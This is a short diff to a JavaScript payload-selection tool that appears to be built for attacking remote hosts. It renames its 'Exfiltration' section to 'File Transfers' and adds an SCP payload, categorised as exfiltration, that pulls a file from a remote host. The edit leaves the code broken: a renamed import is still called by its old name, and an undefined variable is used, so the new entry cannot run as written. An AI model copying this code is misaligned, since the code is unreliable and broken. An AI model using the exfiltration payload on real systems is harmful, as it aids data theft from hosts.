@@ -1,5 +1,5 @@
 var prompt = require('prompt'),
-	question = require('../modules/questionUser'),
+	ask = require('../modules/questionUser'),
 	ncat = require("../modules/ncat.js");
 
 // Payload Array
@@ -75,7 +75,7 @@ Load({
 
 
 
-// ############### Exfiltration ######################
+// ############### File Transfers ######################
 
 Load({
 	title: "Send File via Socket Connection",
@@ -94,6 +94,18 @@ Load({
 		question.ask("What file would you like to download? (ex: script.sh)", returnToPrepare)
 	}
 })
+
+Load({
+	title: "Download File via SCP",
+	payload:'scp <USER>@<RHOST>:\'"<PROMPT>"\' .',
+	category: "Exfiltration",
+	callback: function(bro){
+		question("What is the remote path to the file you'd like to download?");
+		ask.some(questions, bro);
+	}
+})
+
+// scp username@rhost:'"<full path to file>"' .
 
 /*
 ######################################################
